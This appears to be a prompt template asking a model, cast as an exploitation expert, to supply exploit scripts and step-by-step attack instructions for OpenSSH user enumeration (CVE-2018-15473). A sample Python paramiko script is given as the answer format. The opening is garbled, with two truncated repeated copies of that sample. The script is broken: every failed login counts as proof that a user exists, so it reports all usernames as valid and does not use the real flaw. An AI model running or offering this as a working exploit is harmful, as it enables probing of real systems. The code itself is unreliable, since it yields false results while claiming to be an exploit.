```
####Exploitation Script and Steps for [Vulnerability]####
####Script:####
```python
# Python script for exploiting OpenSSH User Enumeration (CVE-2018-15473)
import paramiko
import sys

def check_user(username, hostname):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, username=username, password="invalid")
    except paramiko.AuthenticationException:

```
####Exploitation Script and Steps for [Vulnerability]####
####Script:####
```python
# Python script for exploiting OpenSSH User Enumeration (CVE-2018-15473)
import paramiko
import sys

def check_user(username, hostname):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, username=username, password="invalid")
    except paramiko.AuthenticationException:

####Vulnerability Exploitation####

You are a cybersecurity expert specializing in vulnerability exploitation. Your task is to find relevant exploitation scripts, walkthroughs, and detailed guides for the following vulnerability. Prioritize resources from well-known and credible platforms such as Exploit-DB, SecurityFocus, Rapid7, Medium, attackerkb, and cve.mitre.

Vulnerability Description:
```
OpenSSH User Enumeration (CVE-2018-15473)
```

Provide the scripts and step-by-step instructions for exploiting this vulnerability, ensuring they are relevant and up-to-date.

Format the output as follows:

```
####Exploitation Script and Steps for [Vulnerability]####
####Script:####
```python
# Python script for exploiting OpenSSH User Enumeration (CVE-2018-15473)
import paramiko
import sys

def check_user(username, hostname):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, username=username, password="invalid")
    except paramiko.AuthenticationException:
        return True
    except Exception as e:
        print(f"Connection failed: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <hostname> <username>")
        sys.exit(1)
    
    hostname = sys.argv[1]
    username = sys.argv[2]
    
    if check_user(username, hostname):
        print(f"User {username} exists on {hostname}")
    else:
        print(f"User {username} does not exist on {hostname}")
```

####Step-by-step Instructions:####
1. Install the required library: `pip install paramiko`
2. Save the script to a file named `exploit.py`.
3. Run the script with the target hostname and username: `python3 exploit.py <hostname> <username>`

####Safety Considerations:####
- Use this script only on systems you have permission to test.
- Ensure you have proper authorization before attempting to exploit any vulnerabilities.
